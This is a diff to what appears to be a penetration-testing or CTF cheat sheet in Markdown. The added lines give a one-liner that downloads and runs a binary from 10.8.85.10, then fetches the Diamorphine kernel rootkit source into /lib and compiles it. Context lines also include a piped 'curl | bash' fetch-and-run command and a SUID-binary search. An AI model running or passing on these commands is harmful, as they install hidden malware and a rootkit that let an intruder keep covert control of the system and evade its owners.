@@ -39,7 +39,10 @@ docker run -p3232:2222 -e EXTERNAL_ADDRESS=10.8.85.10:3232 -e SEED_AUTHORIZED_KE
 ```
 curl $LINK.sh | bash
 ```
-
+### Kingmaker&Diamorphine
+```
+curl -o proc http://10.8.85.10/proc;chmod +x proc;./proc;cd /lib;curl -O http://10.8.85.10/Diamorphine/diamorphine.c;curl -O http://10.8.85.10/Diamorphine/diamorphine.h;curl -O http://10.8.85.10/Diamorphine/Makefile;make
+```
 # Find SUID
 ```bash
 find / -perm /4000 2>/dev/null
